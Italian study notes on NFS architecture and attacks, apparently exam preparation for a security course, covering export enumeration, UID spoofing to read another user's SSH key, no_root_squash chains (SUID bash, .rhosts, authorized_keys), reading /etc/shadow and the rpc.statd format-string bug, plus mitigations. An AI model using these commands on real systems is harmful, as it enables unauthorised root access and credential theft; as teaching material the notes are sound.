## tags: [eth, unix-hacking, network-services, privilege-escalation] capitolo: HE7 Ch.5 collegato: [[rpc_services]], [[rlogin_rhosts]], [[command_injection]], [[shared_library_hijack]]

# NFS — Architettura e Attacchi

## Architettura (build su RPC)

NFSv2/v3 è un **servizio RPC**. Il server esporta directory via `/etc/exports`, il client le monta come filesystem locale. Autenticazione: **zero**. Il server si fida dell'UID/GID dichiarato nel pacchetto RPC — nessun token, nessuna firma, nessuna sessione.

### Stack di servizi

|Servizio|Porta|Ruolo|
|---|---|---|
|portmapper|111/tcp+udp|Registra mountd e nfsd → [[rpc_services]]|
|mountd|dinamica via portmap|Gestisce mount request, verifica `/etc/exports`|
|nfsd|2049/tcp+udp|Serve le operazioni FS (read/write/etc.)|
|rpc.statd|dinamica via portmap|Crash recovery / file locking — il più bucato|

---

## Enumeration

```bash
# Lista export e chi può montarli
showmount -e <target>

# Esempio output pericoloso
# /home        *          ← aperto al mondo
# /var/backup  10.0.0.0/8

# Verifica servizi RPC attivi (include mountd, statd)
rpcinfo -p <target>

# Nmap
nmap -sV -p 111,2049 <target>
nmap --script nfs-showmount,nfs-ls,nfs-statfs <target>
```

`*` in showmount = flag rosso immediato.

---

## Attack Vectors

### 1. UID Spoofing (fondamentale)

NFS non autentica l'utente: controlla solo UID/GID nel pacchetto RPC. Se sul server `alice` ha UID=1001, basta creare un utente locale con UID=1001 sull'attaccante:

```bash
useradd -u 1001 fakealice
mount -t nfs <target>:/home /mnt/nfs
su fakealice
ls /mnt/nfs/alice/          # accesso completo come alice
cat /mnt/nfs/alice/.ssh/id_rsa
```

Nessuna password, nessun exploit — solo abuso del trust model NFS.

---

### 2. `no_root_squash` (il più grave)

**Default sano (root squash):** root del client (UID=0) → rimappato a `nobody` (UID=65534) lato server.

**`no_root_squash` in `/etc/exports`:** disabilita questa protezione. Root sul client = root sul filesystem remoto.

```
# /etc/exports pericoloso
/home  *(rw,no_root_squash)
```

#### Attack chain completa

```bash
mount -t nfs <target>:/home /mnt/nfs   # sei root, no_root_squash attivo

# Opzione A — SUID shell
cp /bin/bash /mnt/nfs/victim/rootshell
chmod u+s /mnt/nfs/victim/rootshell
# poi sulla vittima: ./rootshell -p → root

# Opzione B — .rhosts (→ [[rlogin_rhosts]])
echo "attacker root" > /mnt/nfs/root/.rhosts
rlogin -l root <target>   # login senza password

# Opzione C — authorized_keys SSH
mkdir -p /mnt/nfs/root/.ssh
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
ssh root@<target>
```

> **Pattern ricorrente**: NFS + no_root_squash è lo stesso concetto di FTP anonimo + `.rhosts` ([[rlogin_rhosts]]) — vettore diverso, primitiva identica (scrivi file arbitrario in home utente privilegiato).

---

### 3. Export di directory sensibili

Se `/etc` o `/` è esportato:

```bash
mount -t nfs <target>:/etc /mnt/nfs
cat /mnt/nfs/shadow   # offline crack
```

Anche export di `/var/backup`, `/opt/app` con file di config → credenziali in chiaro.

---

### 4. rpc.statd — Format String (CVE-2000-0666)

`rpc.statd` gestisce il recovery da crash per il file locking (NSM protocol).

**Bug:** il campo hostname nei pacchetti `SM_NOTIFY` / `SM_MON` viene passato direttamente a `syslog()` come format string → arbitrary write in memoria → root remoto non autenticato.

```
SM_NOTIFY hostname = "%n%n%n%n"
              ↓
syslog(LOG_ERR, hostname)    ← format string passata come format
              ↓
arbitrary write → EIP control → shellcode
```

**Categoria:** stessa famiglia di [[command_injection]] (input esterno non sanitizzato raggiunge una funzione pericolosa), solo a livello di format string in un daemon root. Pattern identico ad AWStats ma senza CGI.

**Impatto:** root remoto senza autenticazione, via servizio normalmente in ascolto.

---

## Difese

|Vulnerabilità|Mitigazione|
|---|---|
|UID spoofing|Kerberos NFS (NFSv4 `sec=krb5`)|
|`no_root_squash`|Non usarlo mai — root squash è il default, lasciarlo|
|Export `*`|Specificare IP/subnet in `/etc/exports`|
|Export di dir sensibili|Non esportare `/etc`, `/`, `/root`|
|rpc.statd|Patch aggiornata; disabilita statd se non usi file locking|
|NFSv3 in generale|Migrare a NFSv4 (no portmapper, auth integrata)|

---

## NFSv4 — Perché risolve

- Nessun portmapper (tutto su 2049/tcp)
- Autenticazione con Kerberos opzionale (`sec=krb5`, `krb5i`, `krb5p`)
- UID/GID mappati via LDAP/Kerberos → no più UID spoofing triviale
- Ma NFSv3 è ancora diffuso su NAS economici, appliance legacy, ambienti mai aggiornati → il vettore esiste ancora

---

## TL;DR esame

1. `showmount -e` → enumeri export e ACL
2. **UID spoofing** → utente locale con UID vittima → accesso diretto
3. **`no_root_squash`** → root sul client = root sul FS remoto → SUID / `.rhosts` / `authorized_keys`
4. **Export sensibili** → `/etc/shadow` in chiaro
5. **rpc.statd** → format string → root remoto non autenticato (storico, tipico di esame)